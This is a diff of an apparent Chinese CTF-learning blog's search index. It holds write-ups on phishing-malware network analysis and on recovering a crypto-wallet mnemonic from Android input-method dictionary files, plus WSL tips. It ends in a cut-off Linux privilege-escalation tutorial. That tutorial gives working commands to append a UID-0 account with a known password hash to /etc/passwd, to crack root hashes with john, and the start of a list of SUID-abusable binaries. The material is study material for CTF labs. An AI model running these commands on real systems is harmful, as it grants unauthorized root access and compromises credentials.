@@ -80,13 +80,33 @@
       </tags>
   </entry>
   <entry>
-    <title>ACMer</title>
-    <url>/2024/11/ACMer/</url>
-    <content><![CDATA[<p>还没想好写啥</p>
-<p><img src="111.jpg" alt="111"></p>
+    <title>18届软件创新攻防赛部分wp</title>
+    <url>/2025/01/18%E5%B1%8A%E8%BD%AF%E4%BB%B6%E5%88%9B%E6%96%B0%E6%94%BB%E9%98%B2%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
+    <content><![CDATA[<h1 id="1-钓鱼邮件"><a href="#1-钓鱼邮件" class="headerlink" title="1.钓鱼邮件"></a>1.钓鱼邮件</h1><p>拿到一个eml，可以用qq邮箱给自己写信，然后附件带上这个eml，之后自己就能收到这个邮件，预览一下可以看到：</p>
+<img src="屏幕截图 2025-01-05 183618.png" alt="屏幕截图 2025-01-05 183618" style="zoom:75%;">
+
+<p>发现有一个<code>生日礼物.zip</code>，点击下载</p>
+<p>下载得到的zip发现有密码，使用arp爆破一下得到密码：20001111</p>
+<img src="屏幕截图 2025-01-05 183758.png" alt="屏幕截图 2025-01-05 183758" style="zoom: 50%;">
+
+<p>然后发现一个exe，双击运行。</p>
+<p>然后使用火绒剑，监控网络，就能发现这个 生日礼物.exe</p>
+<p>因为会实时变化，记得要截图看会好看一点。</p>
+<img src="屏幕截图 2025-01-05 184101.png" alt="屏幕截图 2025-01-05 184101" style="zoom:75%;">
+
+<p>放大就能看到这个远程地址 222.218.218.218:55555</p>
+<img src="屏幕截图 2025-01-05 184221.png" alt="屏幕截图 2025-01-05 184221" style="zoom:75%;">
+
+<p>包上md5得到flag：df3101212c55ea8c417ad799cfc6b509</p>
 ]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>WP</category>
+      </categories>
       <tags>
-        <tag>ACM</tag>
+        <tag>CTF</tag>
+        <tag>misc</tag>
+        <tag>WP</tag>
       </tags>
   </entry>
   <entry>
@@ -264,36 +284,6 @@
 
 <p>然后点加载,就能在z盘里看到flag</p>
 <img src="2024-12-12 162657.png" alt="2024-12-12 162657" style="zoom:75%;">
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>WP</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>misc</tag>
-        <tag>WP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>18届软件创新攻防赛部分wp</title>
-    <url>/2025/01/18%E5%B1%8A%E8%BD%AF%E4%BB%B6%E5%88%9B%E6%96%B0%E6%94%BB%E9%98%B2%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
-    <content><![CDATA[<h1 id="1-钓鱼邮件"><a href="#1-钓鱼邮件" class="headerlink" title="1.钓鱼邮件"></a>1.钓鱼邮件</h1><p>拿到一个eml，可以用qq邮箱给自己写信，然后附件带上这个eml，之后自己就能收到这个邮件，预览一下可以看到：</p>
-<img src="屏幕截图 2025-01-05 183618.png" alt="屏幕截图 2025-01-05 183618" style="zoom:75%;">
-
-<p>发现有一个<code>生日礼物.zip</code>，点击下载</p>
-<p>下载得到的zip发现有密码，使用arp爆破一下得到密码：20001111</p>
-<img src="屏幕截图 2025-01-05 183758.png" alt="屏幕截图 2025-01-05 183758" style="zoom: 50%;">
-
-<p>然后发现一个exe，双击运行。</p>
-<p>然后使用火绒剑，监控网络，就能发现这个 生日礼物.exe</p>
-<p>因为会实时变化，记得要截图看会好看一点。</p>
-<img src="屏幕截图 2025-01-05 184101.png" alt="屏幕截图 2025-01-05 184101" style="zoom:75%;">
-
-<p>放大就能看到这个远程地址 222.218.218.218:55555</p>
-<img src="屏幕截图 2025-01-05 184221.png" alt="屏幕截图 2025-01-05 184221" style="zoom:75%;">
-
-<p>包上md5得到flag：df3101212c55ea8c417ad799cfc6b509</p>
 ]]></content>
       <categories>
         <category>CTF</category>
@@ -771,12 +761,13 @@
 
 <p>注意，mspaint.exe是画图进程，可能会藏东西，如果有的话可以dump下来，改后缀为.data，使用GIMP2打开图片。不断修改x，y的值直到看到藏的东西。（GIMP2可以在microsoft store里下到）</p>
 <h2 id="vmdk文件"><a href="#vmdk文件" class="headerlink" title=".vmdk文件"></a><u>.vmdk文件</u></h2><p>后缀为 <strong><code>.vmdk</code></strong> 的文件是 VMware 虚拟磁盘文件，通常用于虚拟机环境中存储虚拟机的磁盘数据。</p>
+<p><strong>vmdk可以用7z解压！</strong></p>
 <p>可以使用虚拟机打开试试。</p>
 <p>有些可以看010，有内容的话，可以尝试解密，有时候直接复制解密不了</p>
 <p>可以使用kali自带的7z解密提取这些文件</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7z x flag.vmdk -o./</span><br></pre></td></tr></table></figure>
 
-<p>解压后就能看到好几个文件夹</p>
+<p>解压后就能看到好几个文件夹。</p>
 <h2 id="vhd文件"><a href="#vhd文件" class="headerlink" title="vhd文件"></a><u>vhd文件</u></h2><p>这是磁盘文件，可以直接双击打开，会发现多了两个磁盘，在磁盘里可以找东西</p>
 <p>怎么虚拟化来看图形化界面？</p>
 <p>使用Hyper-V搭建虚拟机（怎么下Hyper-V？<a href="https://blog.csdn.net/wxzjn1027/article/details/140280294?ops_request_misc=%257B%2522request%255Fid%2522%253A%25226933d4915cc7ff339966cfabedb4e6fa%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=6933d4915cc7ff339966cfabedb4e6fa&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-140280294-null-null.142%5Ev100%5Epc_search_result_base8&utm_term=Hyper-V&spm=1018.2226.3001.4187">可以看这个</a></p>
@@ -899,6 +890,33 @@
       </tags>
   </entry>
   <entry>
+    <title>Reverse Record</title>
+    <url>/2024/11/Reverse-Record/</url>
+    <content><![CDATA[<h1 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h1><h3 id="pyc反编译"><a href="#pyc反编译" class="headerlink" title="pyc反编译"></a>pyc反编译</h3><blockquote>
+<p><code>.pyc</code> 是 Python 编译后的字节码文件，通常是在运行 Python 脚本时由解释器自动生成，用于加速程序运行</p>
+<p>想查看 <code>.pyc</code> 文件的源码，可以使用反编译工具 uncompyle6 将其还原为 <code>.py</code> 文件。</p>
+</blockquote>
+<p>-使用 uncompyle6</p>
+<p>-在线网站 <a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a></p>
+<h3 id="exe反编译"><a href="#exe反编译" class="headerlink" title="exe反编译"></a>exe反编译</h3><p>使用IDA</p>
+<h3 id="apk反编译"><a href="#apk反编译" class="headerlink" title="apk反编译"></a>apk反编译</h3><p>使用jadx-gui-1.4.4-no-jre-win.exe</p>
+<h1 id="NewStar-re复现"><a href="#NewStar-re复现" class="headerlink" title="NewStar-re复现"></a><strong>NewStar-re复现</strong></h1><p><strong>学MISC果然还是要带点其他领域，那就学点RE吧！而RE的入门还是觉得NewStar好，不会了还有WP看（bushi</strong></p>
+<h2 id="1-ez-debug"><a href="#1-ez-debug" class="headerlink" title="1.ez_debug"></a><em>1.ez_debug</em></h2><p>当初不会写是因为这个代码风格我有点看不懂，而且很长加上不怎么会调试所以没写出来。</p>
+<p><img src="re2.png" alt="re2"></p>
+<p>这里我们应该发现decrypted flag应该是输入的flag与加密之后再解密的flag比较<br>注意上面的you函数，步入后看到几个变量，下断点，调试</p>
+<p><img src="re3.png" alt="re3"></p>
+<p>能看得到v5的值在缓慢变化成flag，不断f8单步执行即得到flag</p>
+<p>总结:看到提示后应该多步入函数看看，断点也可以下在函数里。F8单步执行可以缓慢查看变量的变化。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>reverse</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Network Traffic Analysis</title>
     <url>/2025/02/Network-Traffic-Analysis/</url>
     <content><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>感觉流量分析真的是MISC中的一个大项，开一篇专门的文章好学习流量分析</p>
@@ -990,30 +1008,645 @@
       </tags>
   </entry>
   <entry>
-    <title>Reverse Record</title>
-    <url>/2024/11/Reverse-Record/</url>
-    <content><![CDATA[<h1 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h1><h3 id="pyc反编译"><a href="#pyc反编译" class="headerlink" title="pyc反编译"></a>pyc反编译</h3><blockquote>
-<p><code>.pyc</code> 是 Python 编译后的字节码文件，通常是在运行 Python 脚本时由解释器自动生成，用于加速程序运行</p>
-<p>想查看 <code>.pyc</code> 文件的源码，可以使用反编译工具 uncompyle6 将其还原为 <code>.py</code> 文件。</p>
+    <title>VNCTF2025misc复现</title>
+    <url>/2025/02/VNCTF2025misc%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p>这个比赛的misc真是难，除了一道签到之外几乎全是区块链和ai，唯一一道的取证还是安卓取证，而且还模拟的真实取证过程。。</p>
+<p>全部的wp可以在vnctf2025的群里有，或者官方公众号。</p>
+<p>打的我道心破碎了要。。。</p>
+<h1 id="VN-Lang"><a href="#VN-Lang" class="headerlink" title="VN_Lang"></a>VN_Lang</h1><p>简单的misc签到题</p>
+<p>打开exe发现是flag但是是vn自创文字</p>
+<p>使用IDA打开exe，直接爆搜VNCTF就能发现flag了</p>
+<img src="屏幕截图 2025-02-10 174246.png" alt="屏幕截图 2025-02-10 174246" style="zoom:80%;">
+
+<p>flag：VNCTF{wXD4cznGnWqVVPRTF1Mzlf7zrPTfBRkKIq2Kgyq4Gohs2}</p>
+<p>这个题好像每个人flag不一样</p>
+<h1 id="Echo-Flowers"><a href="#Echo-Flowers" class="headerlink" title="Echo Flowers"></a>Echo Flowers</h1><p>这个真是毁我道心了，看了一天。。</p>
+<p>拿到echo flowers文件看到里面有一个echo_flowers.ovf文件，可以使用vmware挂载</p>
+<p>虽然这道题挂载不甚有大用就是了</p>
+<p>挂载后看到桌面上只有一个imToken：</p>
+<img src="屏幕截图 2025-02-10 175016.png" alt="屏幕截图 2025-02-10 175016" style="zoom:80%;">
+
+<p>所有应用也只有一点点，在便签，imtoken，设置里面都没有发现什么东西，这就是这道题的神奇之处了</p>
+<p>题目要求恢复密码，我们可以通过找到12个助记词来恢复密码，但是系统中又没有什么提示该怎么办呢？</p>
+<img src="屏幕截图 2025-02-10 175335.png" alt="屏幕截图 2025-02-10 175335" style="zoom:80%;">
+
+<p>在输入法打单词的时候发现有上次遗留的输入。</p>
+<blockquote>
+<p>[!NOTE]</p>
+<p>手动执行 一遍导入助记词流程可以发现，手机安装的某数字钱包App在导入助记词时没有将助 记词输入框设为密码属性，使得输入法可以开启单词联想，而手机安装的某输入法 （包括厂商预装版本）的单词联想是默认开启的。（题目描述中也对此给出了提示： 114 英语不好）  多次导入助记词会发现输入助记词首字母即可联想助记词单词。 </p>
 </blockquote>
-<p>-使用 uncompyle6</p>
-<p>-在线网站 <a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a></p>
-<h3 id="exe反编译"><a href="#exe反编译" class="headerlink" title="exe反编译"></a>exe反编译</h3><p>使用IDA</p>
-<h3 id="apk反编译"><a href="#apk反编译" class="headerlink" title="apk反编译"></a>apk反编译</h3><p>使用jadx-gui-1.4.4-no-jre-win.exe</p>
-<h1 id="NewStar-re复现"><a href="#NewStar-re复现" class="headerlink" title="NewStar-re复现"></a><strong>NewStar-re复现</strong></h1><p><strong>学MISC果然还是要带点其他领域，那就学点RE吧！而RE的入门还是觉得NewStar好，不会了还有WP看（bushi</strong></p>
-<h2 id="1-ez-debug"><a href="#1-ez-debug" class="headerlink" title="1.ez_debug"></a><em>1.ez_debug</em></h2><p>当初不会写是因为这个代码风格我有点看不懂，而且很长加上不怎么会调试所以没写出来。</p>
-<p><img src="re2.png" alt="re2"></p>
-<p>这里我们应该发现decrypted flag应该是输入的flag与加密之后再解密的flag比较<br>注意上面的you函数，步入后看到几个变量，下断点，调试</p>
-<p><img src="re3.png" alt="re3"></p>
-<p>能看得到v5的值在缓慢变化成flag，不断f8单步执行即得到flag</p>
-<p>总结:看到提示后应该多步入函数看看，断点也可以下在函数里。F8单步执行可以缓慢查看变量的变化。</p>
+<p>所以我们可以大致确定助记词的范围，再根据所有2048个助记词确定是那些助记词</p>
+<p>所有2048个助记词： <a href="https://github.com/bitcoin/bips/blob/master/bip-0039/english.txt">bips&#x2F;bip-0039&#x2F;english.txt at master · bitcoin&#x2F;bips</a></p>
+<p>大致确定的助记词：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ramp twenty only space define fashion high carpet muscle laundry couch ranch</span><br></pre></td></tr></table></figure>
+
+<p>接下来要做的就是恢复这12个助记词的顺序了，已知暴力破解这12个助记词顺序是不现实的（因为要好几天），所以我们需要在文件中寻找那个储存了顺序的“词典”文件。</p>
+<p>大概有两种方法：<br><strong>方法一：7z解压vmdk文件</strong></p>
+<p>直接7z解压，能直接把所有vmdk的文件解压出来</p>
+<p>（之前怎么能忘了！）</p>
+<p><strong>方法二：DiskGenius挂载</strong></p>
+<p>网上下一个DiskGenius，可以直接挂载vmdk</p>
+<p>主要DiskGenius可以恢复磁盘上删除的文件这是它的厉害之处</p>
+<p>恢复后如图：<br><img src="屏幕截图 2025-02-10 182557.png" alt="屏幕截图 2025-02-10 182557" style="zoom:80%;"></p>
+<p>。</p>
+<p>。</p>
+<p>总之就是把vmdk里所有文件全部都解压出来，然后在里面找可疑的文件。</p>
+<p>最后找到了<code>android-7.1-r5/data/data/com.sohu.inputmethod.sogouoem/files/dict</code> 这个文件夹下，具体来说就是<code>sgim_gd_usr.bin</code>这个文件</p>
+<p>然后这里有一个比较偏的知识点，就是</p>
+<blockquote>
+<p>[!NOTE]</p>
+<p>搜狗输入法用户词库文件不是utf-8编码而是utf-16</p>
+</blockquote>
+<p>所以一般的记事本和010是很难看出来什么东西的</p>
+<p>这里有两种方法来看到内容</p>
+<p><strong>方法一：使用string命令</strong></p>
+<p>kali自带string命令</p>
+<p><strong>strings命令：用于从二进制文件中提取可打印字符串。它可以提取和显示文件中的所有可打印字符串，常用于分析二进制文件、调试和逆向工程</strong></p>
+<p>先cd</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd android-7.1-r5/data/data/com.sohu.inputmethod.sogouoem/files/dict</span><br></pre></td></tr></table></figure>
+
+<p>然后string</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings --encoding=b * </span><br></pre></td></tr></table></figure>
+
+<p>然后就能看到所有助记词了</p>
+<img src="屏幕截图 2025-02-10 184849.png" alt="屏幕截图 2025-02-10 184849" style="zoom:80%;">
+
+
+
+<p><strong>方法二：notepad++使用utf16查看文件</strong></p>
+<p>找到<code>android-7.1-r5/data/data/com.sohu.inputmethod.sogouoem/files/dict/sgim_gd_usr.bin</code>这个文件，用notepad++，utf16查看也能看到所有助记词，需要眼力</p>
+<img src="屏幕截图 2025-02-10 185223.png" alt="屏幕截图 2025-02-10 185223" style="zoom:80%;">
+
+<p>。</p>
+<p>最后恢复顺序</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ranch only space define laundry carpet muscle ramp high twenty couch fashion</span><br></pre></td></tr></table></figure>
+
+<p>所有助记词和顺序都得到了，直接用找回密码和导出私钥功能，或者使用在线网站<br>网站： <a href="https://iancoleman.io/bip39/">BIP39 - Mnemonic Code</a></p>
+<p>flag：VNCTF{6433c196bb66b0d8ce3aa072d794822fd87edfbc3a30e2f2335a3fb437eb3cda} </p>
 ]]></content>
       <categories>
         <category>CTF</category>
+        <category>WP</category>
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>reverse</tag>
+        <tag>WP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ACMer</title>
+    <url>/2024/11/ACMer/</url>
+    <content><![CDATA[<p>还没想好写啥</p>
+<p><img src="111.jpg" alt="111"></p>
+]]></content>
+      <tags>
+        <tag>ACM</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>wsl启动出错</title>
+    <url>/2024/12/wsl%E5%90%AF%E5%8A%A8%E5%87%BA%E9%94%99/</url>
+    <content><![CDATA[<h1 id="wsl启动出错"><a href="#wsl启动出错" class="headerlink" title="wsl启动出错"></a>wsl启动出错</h1><p><strong>启动出错如下：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">由于未安装所需的特性，无法启动操作。</span><br><span class="line">错误代码: Wsl/Service/CreateInstance/CreateVm/HCS/HCS_E_SERVICE_NOT_AVAILABLE</span><br><span class="line">Press any key to continue...</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="1-启用了-WSL-所需的功能"><a href="#1-启用了-WSL-所需的功能" class="headerlink" title="1.启用了 WSL 所需的功能"></a>1.启用了 WSL 所需的功能</h2><p>可以以管理员身份在powershell输入以下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart</span><br><span class="line">dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart</span><br></pre></td></tr></table></figure>
+
+<p>然后重启电脑，看wsl还能运行吗</p>
+<p>我是运行了这个就好了，界面：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32&gt;dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart</span><br><span class="line"></span><br><span class="line">部署映像服务和管理工具</span><br><span class="line">版本: 10.0.26100.1150</span><br><span class="line"></span><br><span class="line">映像版本: 10.0.26100.2454</span><br><span class="line"></span><br><span class="line">启用一个或多个功能</span><br><span class="line">[==========================100.0%==========================]</span><br><span class="line">操作成功完成。</span><br><span class="line"></span><br><span class="line">C:\Windows\System32&gt;dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart</span><br><span class="line"></span><br><span class="line">部署映像服务和管理工具</span><br><span class="line">版本: 10.0.26100.1150</span><br><span class="line"></span><br><span class="line">映像版本: 10.0.26100.2454</span><br><span class="line"></span><br><span class="line">启用一个或多个功能</span><br><span class="line">[==========================100.0%==========================]</span><br><span class="line">操作成功完成。</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-更新-WSL-核心"><a href="#2-更新-WSL-核心" class="headerlink" title="2.更新 WSL 核心"></a>2.更新 WSL 核心</h2><p>WSL 需要最新版本的核心来支持虚拟机实例。更新核心：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --update</span><br></pre></td></tr></table></figure>
+
+<p>运行后检查版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --version</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="3-检查虚拟化支持"><a href="#3-检查虚拟化支持" class="headerlink" title="3.检查虚拟化支持"></a>3.<strong>检查虚拟化支持</strong></h2><p>确保启用了虚拟化支持</p>
+<h2 id="4-重置或重装-WSL"><a href="#4-重置或重装-WSL" class="headerlink" title="4.重置或重装 WSL"></a>4.<strong>重置或重装 WSL</strong></h2><p>实在不行重置 WSL：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --unregister &lt;你的发行版名称&gt;</span><br></pre></td></tr></table></figure>
+
+<p>或者重装 WSL：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --install</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="5-检查-Windows-服务"><a href="#5-检查-Windows-服务" class="headerlink" title="5.检查 Windows 服务"></a>5.检查 Windows 服务</h2><p>错误代码中提到 <strong>HCS_E_SERVICE_NOT_AVAILABLE</strong> 可能表明相关服务未运行：</p>
+<p>按 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Win + R</span><br></pre></td></tr></table></figure>
+
+<p> 键，输入 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">services.msc</span><br></pre></td></tr></table></figure>
+
+<p>，检查以下服务是否已启动：</p>
+<p><strong>Hyper-V Host Compute Service</strong></p>
+<p><strong>Virtual Machine Management</strong></p>
+<p>如果未启动，右键启动这些服务。</p>
+]]></content>
+      <tags>
+        <tag>wsl</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux提权浅析</title>
+    <url>/2025/01/Linux%E6%8F%90%E6%9D%83%E6%B5%85%E6%9E%90/</url>
+    <content><![CDATA[<h1 id="passwd提权"><a href="#passwd提权" class="headerlink" title="passwd提权"></a>passwd提权</h1><p><code>/etc/passwd</code>和 <code>/etc/shadow</code>文件是 Linux 系统登录认证的关键文件，如果系统运维人员对 <code>passwd</code>或 <code>shadow</code>文件的内容或权限配置有误，则可以被利用来进行系统提权。</p>
+<p>我们先了解一下 <code>/etc/passwd</code>内容的含义：</p>
+<p>Linux 密码信息保存在两个文件中，分别为：<code>/etc/passwd</code>和 <code>/etc/shadow</code></p>
+<p><code>/etc/passwd</code>文件用于保存用户信息，<strong>每一行代表一个用户</strong>，每一行通过冒号 <code>:</code>分为七个部分:</p>
+<ol>
+<li>用户名</li>
+<li>密码，若为 <code>x</code>则表示密码保存在<code>/etc/shadow</code></li>
+<li>UID，0 代表 root</li>
+<li>GID，表示所在组</li>
+<li>描述信息，依次为 Full Name、Room Number、Work Phone、Home Phone 和 Other</li>
+<li>用户主目录</li>
+<li>默认 shell 类型</li>
+</ol>
+<p>例如，假设 <code>/etc/passwd</code>文件中其中一行信息如下：</p>
+<p><img src="1607657766_5fd2e926952afffe8e697.png" alt="1607657766_5fd2e926952afffe8e697"></p>
+<p>其含义解读如下：</p>
+<p>​	*用户名：test-user</p>
+<p>​	*密码保存在 <code>/etc/shadow</code>中</p>
+<p>​	*UID 为 1001</p>
+<p>​	*GID 为 1001</p>
+<p>​	*描述信息： Full Name [test]: Room Number [11111]: Work Phone [111111-11]: Home Phone [222222-22]: Other [test]</p>
+<p>​	*用户主目录为 <code>/home/test-user</code></p>
+<p>​	*默认 shell 为 <code>/bin/bash</code></p>
+<p>因此在登陆时候的权限是通过第三个字段 <code>UID</code>和第四个字段 <code>GID</code>确定。其中 <code>UID=0</code>代表 root 用户</p>
+<p><strong>如果我们能够对 <code>/etc/passwd</code>文件内容进行伪造、篡改，那就能很轻易的登录成功并获取任意用户权限。</strong></p>
+<p>所以，获取passwd的写入权限十分重要</p>
+<p>通常来说，通过 <code>/etc/passwd</code>提权的方法有两种：</p>
+<ol>
+<li>如果具有 <code>/etc/passwd</code>的 <strong>w</strong> (写入) 权限，可以直接添加一个 root 权限的用户</li>
+<li>如果 <code>/etc/passwd</code>中存储 root 用户密码哈希，可以使用 john 进行破解</li>
+</ol>
+<h3 id="场景一：-etc-passwd-具有写权限"><a href="#场景一：-etc-passwd-具有写权限" class="headerlink" title="场景一：&#x2F;etc&#x2F;passwd 具有写权限"></a>场景一：&#x2F;etc&#x2F;passwd 具有写权限</h3><p>查看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -alh /etc/passwd /etc/shadow</span><br></pre></td></tr></table></figure>
+
+<p>如果有 <code>--wx--xrwx</code> 意味着我们具有写入权限，接下来我们需要做的就是</p>
+<p><strong>自己构造一行用户数据添加到 passwd 文件中，用户名和密码自定义，并且将 <code>UID</code>设置为 <code>0</code>，此时我们登陆就可以获取 root 权限。</strong></p>
+<p>查看 passwd 文件中 root 用户数据的格式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd|grep root</span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>先设置用户名，如syl-passwd</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syl-passwd:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>设置密码，由于密码并不是明文而是经过 hash 算法加密之后的密文字符串，我们使用 <code>openssl</code>套件</p>
+<p>使用 <code>openssl</code>创建一个密码为 pass123 的 linux hash，命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt ignite pass123</span><br><span class="line">#-1 ：使用 MD5 hash 算法</span><br><span class="line">#-salt ：对 hash 算法加 &quot;盐&quot;</span><br></pre></td></tr></table></figure>
+
+<p>计算得到密码$1$ignite$3eTbJm98O9Hz.k1NTdNxe1，接着构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syl-passwd:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>添加到passwd</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;syl-passwd:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br><span class="line">#必须使用单引号，不能使用双引号</span><br><span class="line">#使用 &gt;&gt;，而不是 &gt;</span><br></pre></td></tr></table></figure>
+
+<p>这样即添加成功，也可以再次查看一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd|grep syl-passwd</span><br></pre></td></tr></table></figure>
+
+<p>接下来su syl-passwd切换到 syl-passwd 用户，密码为 pass123即可拿到权限</p>
+<h3 id="场景二：-etc-passwd-存储用户密码-hash"><a href="#场景二：-etc-passwd-存储用户密码-hash" class="headerlink" title="场景二：&#x2F;etc&#x2F;passwd 存储用户密码 hash"></a>场景二：&#x2F;etc&#x2F;passwd 存储用户密码 hash</h3><p>一样查看读写权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -alh /etc/passwd /etc/shadow</span><br></pre></td></tr></table></figure>
+
+<p>但是发现权限配置都是正确的，普通用户只具有 <code>/etc/passwd</code>文件的<strong>读</strong>权限。</p>
+<p>接下来查看 <code>/etc/passwd</code>文件的内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>结果发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$1$ignite$J98A8EVPG1O40.WnwrPEM1:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>中间的$1$ignite$J98A8EVPG1O40.WnwrPEM1即是root的密码哈希值，接下来所做的就是john了</p>
+<p>先将之前获取到的 root 用户 hash 写入文件 hash.txt 中：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;root:$1$ignite$J98A8EVPG1O40.WnwrPEM1:0:0:root:/root:/bin/bash&#x27; &gt; ~/hash.txt</span><br><span class="line"># 此处必须单引号</span><br></pre></td></tr></table></figure>
+
+<p>然后就john：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john ~/hash.txt</span><br></pre></td></tr></table></figure>
+
+<p>最后得到密码是hello</p>
+<p>接下来就一样了，su root，提权。</p>
+<h1 id="shadow提权"><a href="#shadow提权" class="headerlink" title="shadow提权"></a>shadow提权</h1><p>shadow提权与passwd类似</p>
+<p>都是获取root密码的哈希值然后进行爆破</p>
+<h1 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h1><p><strong>什么是suid提权？</strong></p>
+<p>SUID是Linux的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。所以利用suid提权的核心就是运行root用户所拥有的suid的文件，那么运行该文件的时候就得获得root用户的身份了。</p>
+<p>suid特点是用户运行某个程序时，如果该程序有suid权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。</p>
+<p>linux引入了3个文件来管理用户组：</p>
+<ol>
+<li>&#x2F;etc&#x2F;passwd存放用户信息。</li>
+<li>&#x2F;etc&#x2F;shadow存放用户密码信息。</li>
+<li>&#x2F;etc&#x2F;group存放组信息</li>
+</ol>
+<p>利用原理：在执行过程中，调用者会暂时获得该文件的所有者权限，且该权限只在程序执行的过程中有效。假设可执行文件binexec其属主为root，当以非root身份登录时，如binexec设置了suid权限，就可以在非root身份下运行该可执行文件，可执行文件运行时该进程的权限为root权限。</p>
+<h2 id="如何设置suid"><a href="#如何设置suid" class="headerlink" title="如何设置suid"></a>如何设置suid</h2><p>列出所有文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -al</span><br></pre></td></tr></table></figure>
+
+<p>设置suid：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod u+s filename #设置suid</span><br><span class="line">chmod u-s filename #去除suid</span><br></pre></td></tr></table></figure>
+
+<p>如果文件从<code>-rw</code>变成了<code>-rwS</code>说明添加上了suid权限</p>
+<p>注意：</p>
+<ul>
+<li>只有可以执行的二进制程序文件才能设定SUID权限,非二进制文件设置SUID权限没任何意义</li>
+<li>命令执行者要对该程序文件拥有执行(x)权限才能使用</li>
+<li>SUID权限只在该程序执行过程中有效,也就是说身份改变只在程序执行过程中有效</li>
+</ul>
+<p>具有suid权限的二进制可执行文件有：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap</span><br><span class="line">vim</span><br><span class="line">find</span><br><span class="line">bash</span><br><span class="line">more</span><br><span class="line">less</span><br><span class="line">nano</span><br><span class="line">cp</span><br><span class="line">awk</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="如何查找"><a href="#如何查找" class="headerlink" title="如何查找"></a>如何查找</h2><p>查找系统上运行的suid文件，且查找具有root权限的</p>
